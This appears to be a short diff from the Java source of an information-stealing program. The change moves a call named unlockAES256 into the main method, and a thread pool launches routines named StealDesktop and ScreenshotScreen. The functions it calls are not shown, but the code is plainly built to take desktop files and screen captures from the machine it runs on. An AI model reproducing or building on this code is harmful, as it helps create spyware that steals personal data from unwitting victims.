@@ -20,11 +20,11 @@ public class back {
 
     public static void main(String[] args){
         System.out.println("Se pa ta ligado");
+        utils.unlockAES256();
         xd();
     }
 
     public static void xd(){
-        utils.unlockAES256();
         ExecutorService ex = Executors.newFixedThreadPool(4);
         ex.submit(() -> zero.StealDesktop());
         ex.submit(() -> zero.ScreenshotScreen());
